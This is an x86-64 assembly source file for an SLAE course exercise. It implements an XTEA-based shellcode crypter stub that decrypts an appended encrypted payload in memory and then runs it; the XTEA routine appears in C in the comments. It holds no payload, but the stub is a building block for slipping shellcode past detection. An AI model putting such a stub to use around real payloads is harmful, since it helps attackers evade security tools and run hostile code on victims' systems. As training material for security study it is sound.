; Author :      Demey Alexandre (PA-14186)
; Date :        11-06-2020
; 
; Description : SLAE assignment #7 - (XTEA) Custom shellcode crypter
;
; Stub fixed size : 117 bytes (with the key)
;             
; Automaticaly inserted : 
; 	encoded payload size => 15th byte
; 	blocks pairs number => 17th byte


; from https://fr.wikipedia.org/wiki/XTEA
; void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
;     unsigned int i;
;     uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;
;     for (i=0; i < num_rounds; i++) {
;         v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
;         sum -= delta;
;         v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
;     }
;     v[0]=v0; v[1]=v1;
; }


global _start
section .text

_start:
    lea rsi, [rel _start]  ; get memory address of this instruction 
    add rsi, 101           ; point to memory address of encoded payload (base + stub length without the key)
    lea r11, [rsi + 24]    ; point to the key (rsi + payload size)

    push 3              ; nb of blocks pairs
    pop rcx


next_blocks:
    push rcx		; save actual block pair number on stack
    mov r10, 0x8dde6e40   ; init sum
    push rsi		; backup encoded payload base address
    lodsd		; load first block in eax	
    xchg eax, ebx	; copy it into ebx	
    lodsd		; load second block
    xchg eax, ebx	; exchange first and second block

    push 64		; set number of iteration
    pop rcx


decipher_loop:

    push rcx		; counter used to know if we are working on v1 -=... or v0 -=.....
    mov cl, 3		; because they are slightly different (sum >> 11)


internal:

    push rax            ; push value of first block for later use
    push rax
    mov edx, eax	
    
    shl eax, 4          ; vx << 4
    shr edx, 5          ; vx >> 5 
    xor eax, edx        ; (vx << 4) ^ (vx >> 5)
    pop rdx
    add edx, eax        ; ((vx << 4) ^ (vx >> 5)) + v0

    push r10
    pop rax
    dec ecx
    je v0		; if we work on v0 no need jump

    shr eax, 11         ; sum >> 11 

  v0:       
    and eax, 3          ; sum & 3
    mov dword eax, [r11 + 4*rax]    ; key[sum&3]
    add eax, r10d        ; sum + key[sum&3]
    xor eax, edx        ; () ^ ()
    sub ebx, eax        ; vx -= () ^ ()
    pop rax             ; vx
    
    dec ecx
    js next		 ; if signed then we are ending (v0 -=...) part so we jump to the next iteration 

    sub r10d, 0x9E3779B9 ; sum -= delta
    xchg eax, ebx	 ; exchange v1 and v0 value
    jmp internal	 ; jump to start v0 -= part

  next:
    pop rcx		 ; set to iteration counter
    xchg eax, ebx        ; exchange v0 and v1
    loopnz decipher_loop 


    pop rdi		 ; get base memory address of encoded payload (of first block not decoded)
    stosd		 ; replace encoded block with its decoded version
    xchg eax, ebx	 ; set v1 in eax
    stosd		 ; replace second decoded block

    pop rcx		 ; get blocks pair counter
    loopnz next_blocks   ; if there are other encoded pair jump else execute decoded payload

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Encoded payload + key, will be appended here.
